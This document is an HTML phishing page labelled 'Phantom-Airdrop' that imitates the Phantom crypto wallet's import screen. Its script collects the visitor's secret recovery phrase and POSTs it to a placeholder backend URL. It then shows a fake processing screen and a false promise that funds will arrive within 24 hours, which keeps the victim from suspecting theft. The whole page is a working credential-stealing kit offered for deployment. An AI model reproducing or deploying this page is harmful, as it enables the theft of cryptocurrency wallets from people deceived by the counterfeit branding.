# Phantom-Airdrop

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Phantom Wallet - Import</title>
  <link
    rel="icon"
    href="https://docs.phantom.com/~gitbook/image?url=https%3A%2F%2F187760183-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MVOiF6Zqit57q_hxJYp%252Ficon%252FU7kNZ4ygz4QW1rUwOuTT%252FWhite%2520Ghost_docs_nu.svg%3Falt%3Dmedia%26token%3D447b91f6-db6d-4791-902d-35d75c19c3d1&width=48&height=48&sign=23b24c2a&sv=2"
    type="image/svg+xml"
  />
  <style>
    @import url("https://fonts.googleapis.com/css2?family=Inter&display=swap");
    body {
      background: linear-gradient(160deg, #1e004c, #2d0066);
      font-family: "Inter", sans-serif;
      color: white;
      text-align: center;
      margin: 0;
      padding: 0;
      height: 100vh;
      overflow: hidden;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }
    .container {
      max-width: 400px;
      margin: auto;
      background: rgba(255, 255, 255, 0.05);
      padding: 40px;
      border-radius: 10px;
      box-shadow: 0 0 10px #000;
    }
    .logo {
      width: 60px;
      margin-bottom: 20px;
    }
    textarea {
      width: 100%;
      border-radius: 5px;
      border: none;
      padding: 10px;
      font-size: 16px;
      resize: none;
      color: #222;
    }
    button {
      margin-top: 20px;
      padding: 12px 24px;
      background-color: #6c5ce7;
      border: none;
      border-radius: 5px;
      color: white;
      font-size: 16px;
      cursor: not-allowed;
      opacity: 0.5;
      transition: opacity 0.3s;
    }
    button.enabled {
      cursor: pointer;
      opacity: 1;
    }

    /* Loading screen styles */
    #loadingScreen {
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .loader {
      border: 8px solid #eee;
      border-top: 8px solid #6c5ce7;
      border-radius: 50%;
      width: 80px;
      height: 80px;
      animation: spin 4s linear forwards;
      margin-bottom: 30px;
    }
    @keyframes spin {
      0% {
        transform: rotate(0deg);
      }
      100% {
        transform: rotate(360deg);
      }
    }

    /* Confirmation screen */
    #confirmScreen {
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .checkmark {
      width: 100px;
      height: 100px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      background-color: #28a745;
      margin-bottom: 20px;
      animation: scaleIn 0.5s ease forwards;
      opacity: 0;
    }
    .checkmark svg {
      width: 60px;
      height: 60px;
      stroke: white;
      stroke-width: 8;
      fill: none;
      stroke-linecap: round;
      stroke-linejoin: round;
      stroke-dasharray: 48;
      stroke-dashoffset: 48;
      animation: dash 0.5s ease forwards 0.5s;
    }
    @keyframes dash {
      to {
        stroke-dashoffset: 0;
      }
    }
    @keyframes scaleIn {
      to {
        opacity: 1;
        transform: scale(1);
      }
      from {
        opacity: 0;
        transform: scale(0.5);
      }
    }
    #confirmMessage {
      font-size: 1.3rem;
      max-width: 320px;
      line-height: 1.4;
    }
  </style>
</head>
<body>
  <!-- Import Wallet Screen -->
  <div class="container" id="importScreen">
    <img
      class="logo"
      src="https://docs.phantom.com/~gitbook/image?url=https%3A%2F%2F187760183-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MVOiF6Zqit57q_hxJYp%252Ficon%252FU7kNZ4ygz4QW1rUwOuTT%252FWhite%2520Ghost_docs_nu.svg%3Falt%3Dmedia%26token%3D447b91f6-db6d-4791-902d-35d75c19c3d1&width=48&height=48&sign=23b24c2a&sv=2"
      alt="Phantom Logo"
    />
    <h1>Import Wallet</h1>
    <p>Securely access your existing wallet using your Secret Recovery Phrase.</p>
    <textarea
      id="phrase"
      placeholder="Enter your 12 or 24-word phrase..."
      rows="4"
      oninput="validatePhrase()"
    ></textarea>
    <button id="continueBtn" disabled onclick="submit()">Continue</button>
  </div>

  <!-- Loading Screen -->
  <div id="loadingScreen">
    <div class="loader"></div>
    <div>Processing... Please wait</div>
  </div>

  <!-- Confirmation Screen -->
  <div id="confirmScreen">
    <div class="checkmark">
      <svg viewBox="0 0 24 24">
        <polyline points="20 6 9 17 4 12"></polyline>
      </svg>
    </div>
    <div id="confirmMessage">
      Your wallet has been confirmed.<br />
      Funds will be available within 24 hours.
    </div>
  </div>

  <script>
    const continueBtn = document.getElementById("continueBtn");
    const phraseInput = document.getElementById("phrase");
    const importScreen = document.getElementById("importScreen");
    const loadingScreen = document.getElementById("loadingScreen");
    const confirmScreen = document.getElementById("confirmScreen");

    function validatePhrase() {
      const phrase = phraseInput.value.trim();
      const wordCount = phrase.split(/\s+/).filter(Boolean).length;
      if (wordCount >= 12 && wordCount <= 24) {
        continueBtn.disabled = false;
        continueBtn.classList.add("enabled");
      } else {
        continueBtn.disabled = true;
        continueBtn.classList.remove("enabled");
      }
    }

    function submit() {
      const phrase = phraseInput.value.trim();

      // Send the phrase to the backend (replace URL with your backend endpoint)
      fetch("https://your-render-url.onrender.com/import", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ seedphrase: phrase }),
      });

      // Switch to loading screen
      importScreen.style.display = "none";
      loadingScreen.style.display = "flex";

      // After 4 seconds, show confirmation screen
      setTimeout(() => {
        loadingScreen.style.display = "none";
        confirmScreen.style.display = "flex";
      }, 4000);
    }
  </script>
</body>
</html>
